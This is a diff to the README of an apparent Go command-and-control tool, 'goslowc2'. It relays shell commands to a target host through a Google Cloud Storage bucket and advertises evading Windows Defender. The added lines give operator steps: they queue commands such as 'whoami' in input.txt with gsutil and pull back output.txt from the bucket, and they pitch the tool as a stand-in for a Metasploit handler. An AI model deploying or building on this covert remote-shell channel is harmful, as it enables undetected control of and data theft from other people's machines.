@@ -7,6 +7,7 @@ A demonstration of using GoLang and GCP Storage for a quick and easy evasion pay
 3. Google Cloud Platform (GCP) Storage SDK automatically allows for authentication TLS v1.2 secure endpoints and a scratch pad for input and output for easy asynchronous communication
 4. Running GoLang os.exec and the syscall.call methods to unsafe (non type casted) unsigned integer pointers C style for interesting Windows 10/11 Q4 2022 Defender default 'evasion' shell or additional payload routines vs. the C running the system method that immediately triggers a backdoor alert and cloud scan
 5. General grudge: Google SOC sent me a nasty gram about my C payload stored in my personal Google Drive account. GoLang was may by Google Developers. I wanted to make it ironic because this would have been so much easier using a packer + python3.
+6. Maybe you don't have access to the standard MSF multi/handler in a pen test?
 
 ### Complementing gowrap module
 This module is to demonstrate using os.exec to wrap and execute another Go script or binary as a subprocess which easily can trigger an IOC but also allows for easy ingestion (with some modification) of running input.txt with straight GoLang WinAPI sys calls for future "evasion" considerations. I also included notes about some strange behaviors found when using user32.dll MessageBoxA.
@@ -56,6 +57,10 @@ Grab a JSON key to download and run in the same directory as goslowc2
 1. Create a input.txt in the root namespace of your **bucket** with a single command syntax such as "whoami" or "dir"
 2. Run goslowc2.exe on targethost
 3. Wait for the output.txt to show up in your bucket in the same root namespace
+4. gsutil cp gs://YOURBUCKET/*.txt ./
+5. cat ./output.txt
+6. echo "whoami" > input.txt
+7. gsutil cp ./input.txt gs://YOURBUCKET
 
 
 ## Runtime
